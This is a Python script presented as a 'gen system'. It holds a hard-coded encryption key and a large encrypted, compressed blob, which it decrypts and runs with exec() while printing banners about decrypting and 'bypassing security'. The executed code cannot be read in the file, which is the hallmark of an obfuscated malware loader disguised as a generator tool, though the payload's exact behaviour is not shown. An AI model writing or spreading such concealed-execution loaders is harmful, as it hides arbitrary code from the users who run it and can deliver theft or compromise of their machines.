import os
import zlib
import base64
from cryptography.fernet import Fernet
from colorama import Fore, init

init(autoreset=True)

_k = b'7aPDCVy0tQ4sAwguvfNOsOaLj_0OJkkDkPyjXtWRVlQ='
_f = Fernet(_k)
_data = b'gAAAAABpfjIzebL5xfFBw6hdcVBKUd09Txj0m5iWTeT9Ez7tic5CNlQrwFcBD8FZePmx47qdC90Y6wFalMdt9RAusjE_2XNd2UWDS4rSwoNuYTcKWgfrvLVEZNJ_JMCvpix7Cr4dQwbiayixIsSbphXKefJv9Ak650ZQuyJyUVMaZTHY-54_GzlAnnysFqyJk-nac9qG3SJWunSqcKM8mnGnG8kio7ha_v5-HE91RCpPSUPSbvi0hvjG-l5tzuFVJQyH5BeAN4jra5QsQPoQaq774zYTtAr4CQY6YGjQDwPyisM-nAuLQ0hn3_rjStCaKzQb8hES-nUDxxM43-jc6LIezX0ETvxP_FiFZ6CgsLYaF1_fFAuA07un6QnLVNpEvswgk0fl0H5DLjNgJbNXMzvrD3SPTcwwKnWkHsdUWs9uNeivh9MoglbUit8fAA0N9ctxUwc4XNIIvoUNTDzEBwg9wpKGKkJWV14L2Xb4QGlATg4T6xZw-5AtMnhX2_jnvdaB6hNfjFKymSnjRmXENADCPrksBsxe5n5u4g6Ol9vl7GayGAJJZfqQvSVPeIC-TaupF6Uhp_m_fLxXF6GQCzLmRCSSVpWMONHWm0N953aGI1qeyN3BgTS221pOV116sB009zFMT6ByB0RMVC9JXGaAxg8fFufMjcQsQA30pVUg8ANOoFNcP9j-xcl8SjfgV5shEFXAkwmDHE4twQb-AZYZe1KrlMerQeVD7WmQHKwU3I6uj_5_r_Gjpc6mGgs8OXNNTiWfu_WZcUtVF3JZ6bOQNZRFATYou8wlMVYlkb_vv1Gh0HMCcMI1qnAZZsPa_n8v8despg7mBbWbzoM9j0OYdrpAewVn2WAFknRfk1qmV2JEKLdLLpLvSRsrgAXWqqPf11fux-qStTMFr-8fXpPK7k3zBkhbkBbghcU-kuDyPRR2GoHIhABASuelu2M0D1qCtH-8KrKhWHe5il4F5RUCEofPMO61tee4imVTj4WndqZc_ERNzV8AB-ES0Bb3XdH5VM902CFTyRRBBqLSwty8kennSL_sdwzL5Ga8AJ1Ye8_XmxsxfW0jbGGKzii3fyS9rIDPnQaetMgFah5JA-9Z3gzVAx-LGMdixXYgTNxuxzhRK_zFbQeh16tMyRW_adhfP1WD4dOvJ-DcJFuQMb5NHeo69powsUFADq2ll1Gp28FfzR97BNdPhyffzkH2KAU6dP5HTSr-yxECBLU3CPl4WY0v4ESnJ0SyDETIIhD708awAdgWoYB8BPP7mG6neZaSZWyhAdmg9biho0ba10D4iX3yjsr80wLwjLbjtnviuHXdNOL_GMw9VPpixrKUkZDLKOilqu8Qiv0gsXg770X8HLfMULjDV5Ex2l6rrUc6Yed21Xa7C-27-ATdfw2hw1_qx3f-SkDMBpC-n0F8aFTFDbpMCsCkHyVYutpB0c2xlCFygnbJuHjxVw1DemwLNj4LFXUnbjC-l4TyqFLLThagoaApWCSPCuaTISjeX-oEKWvH3zpwv6gmiXlzwb3Fa1QYsmPcrr_cQRnJTvorHv-zz-9Aj92C89F2T1JSr8wmUSq4mR2npfW0GtM1GYh9fl16XfyESRvQjNG5wi0n5E3YaL_NiIIFP78YqPC3_RWjk0CIjs1sTbZe5UKHOCyLxznaOT6W37IJZkmBXSchrbqTz5YgpkCd6Yg1nXB6vKwGbWQ80JrQBWmC-yP6cOIYVfZdxXoimSeeVZPD9PRu7lH3JafZnjeo3F05Y6tis5A9Sa4hdOBKSptD53XHrsfLIsLOL5SwMdlL_ZYRDMNEhs_1J6SPo5xDBAaHtd9mi-tPy9KHhjEu5_a1r3xlYis2nf0VMwhy6OTOUoHWifhDZ3G235uQA3XOocEA0KM6Z91u1qt8QaxkjqbEf0kDltRXUJmzLOp_hOH4SqGahg39tDYHRnnr-aRcX2fDjAlqZ8HUka00x4klhwLtIzki-SJEPxRqm3jQ4BW_5tkbu_9BpFx5H11YwrvWaWHhYFL0xozjuiB0_HiuGUSBoyLu6MfNqqMkfYT1r_AtFLmOBmYSOir-VWs_P-KO9Hre66yB6BXyI9go5SBUR2wptIYTTp9-OI8kXfYzk46-8cfNFNDrVloR1nLAnXvYER9VxmCABk0EG81sTpErI_eecFqRp8sGx7n63j8YF6K6qVbeJujiRVOOBJN9m3CS395O31CpuNgqEcC0Ju1ec7qf3AfZCDTJG6oKx-TbMZ-ZLSwNkl-SAhP75dv1D8MtQGY2B6y4izb7Zl9kjZFaoNGxYQ1O4Y2lqQ8VxRGxsPnSdd9C0LZvuSw8bnHmEqVQclbHy07LOyia3RFSkVJ1tSpFU1wL0gT1U0uWEOtm8fUsi_MUl3S5F_bTQfhl8IpR9Cfmwpoy3cMU9snu-5cU_VZDNvNNMnfe4qju0sVz64YaGTrpRN3cbj-EpIfLOuQ1Q7DhOeLSDKKWe9vYnq36TqeZvK6sc3fTV4eDGVHQZdIodfCHgpP79AKcgac3xpW78f_TquczxdHyoXG9guC4I_9JK3vHslNaOqgMIeOp9qRivrFhYFdJGJxyjOuor5G7OouS_DY_m80F8GVjpV_5mucDLv9HpKjVHpXvFKOHc5CkpY8t-pCLDoCWmRlZ4S7atQ=='

def run_gen():
    print(Fore.RED + "========================================")
    print(Fore.CYAN + "      DECRYPTING GEN SYSTEM...         ")
    print(Fore.YELLOW + "      BYPASSING SECURITY...            ")
    print(Fore.RED + "========================================")
    
    try:
        code = zlib.decompress(_f.decrypt(_data)).decode()
        exec(code, globals())
    except Exception as e:
        print("Gen Decrypt Error:", e)

if __name__ == "__main__":
    run_gen()